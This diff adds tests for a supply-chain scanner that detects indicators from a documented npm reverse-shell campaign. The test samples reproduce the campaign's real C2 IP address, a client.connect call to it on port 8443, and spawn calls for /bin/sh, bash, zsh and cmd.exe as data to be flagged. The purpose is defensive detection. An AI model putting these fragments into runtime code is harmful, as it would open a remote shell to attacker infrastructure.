@@ -771,6 +771,68 @@ test("verify-no-registry-exfiltration flags Telegram-bot SSH-backdoor IOCs", asy
   assert.match(findings[7]!.reason, /checkip\.amazonaws\.com/);
 });
 
+test("verify-no-registry-exfiltration flags Advcash reverse-shell IOCs", async () => {
+  // Socket 2025-04-14 reverse-shell campaign documented at
+  // https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell —
+  // `@naderabdi/merchant-advcash` posed as a payment-gateway integration
+  // and dialed a reverse shell via `cp.spawn("/bin/sh", [])` +
+  // `client.connect(8443, "65.109.184.223")` from the `url_success`
+  // callback. The IOC IP appears as a BARE literal (not in a URL),
+  // and `/bin/sh` / `/bin/bash` / `cmd.exe` shell-name literals have
+  // no legitimate use in `src/**`.
+  const { findForbiddenRegistryExfilCalls } = await import(
+    "../scripts/verify-no-registry-exfiltration.js"
+  );
+  const sample = [
+    "// unsafe: documented Advcash reverse-shell C2 IP, bare literal",
+    'const c2 = "65.109.184.223";',
+    "",
+    "// unsafe: same IP used inside `client.connect(8443, ...)`",
+    'client.connect(8443, "65.109.184.223");',
+    "",
+    "// unsafe: reverse-shell shell prefix (sh)",
+    'cp.spawn("/bin/sh", []);',
+    "",
+    "// unsafe: reverse-shell shell prefix (bash)",
+    'cp.spawn("/bin/bash", ["-i"]);',
+    "",
+    "// unsafe: reverse-shell shell prefix (zsh)",
+    'cp.spawn("/bin/zsh", []);',
+    "",
+    "// unsafe: Windows reverse-shell shell prefix",
+    'cp.spawn("cmd.exe", ["/c", "whoami"]);',
+  ].join("\n");
+  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
+  assert.equal(findings.length, 6, JSON.stringify(findings, null, 2));
+  assert.match(findings[0]!.reason, /65\.109\.184\.223/);
+  assert.match(findings[1]!.reason, /65\.109\.184\.223/);
+  for (const shellFinding of findings.slice(2)) {
+    assert.match(shellFinding.reason, /reverse-shell shell prefix|shell-name literal/i);
+    assert.match(shellFinding.reason, /merchant-advcash/i);
+  }
+});
+
+test("verify-no-registry-exfiltration ignores benign IP-shaped tokens", async () => {
+  // Negative: dotted-quad version strings, doc-comment mentions of
+  // the IOC IP, and benign shell-name mentions inside line comments
+  // must NOT trip the Advcash gate.
+  const { findForbiddenRegistryExfilCalls } = await import(
+    "../scripts/verify-no-registry-exfiltration.js"
+  );
+  const sample = [
+    "// safe: doc-comment mention of the IOC IP",
+    "// the Advcash C2 was 65.109.184.223 on port 8443",
+    "",
+    "// safe: dotted-quad version literal that is NOT the IOC IP",
+    'const version = "1.2.3.4";',
+    "",
+    "// safe: line-comment mention of /bin/sh",
+    "// note: never spawn /bin/sh from runtime code",
+  ].join("\n");
+  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
+  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
+});
+
 test("verify-no-registry-exfiltration accepts the live src/ tree", async () => {
   const { findForbiddenRegistryExfilCalls } = await import(
     "../scripts/verify-no-registry-exfiltration.js"
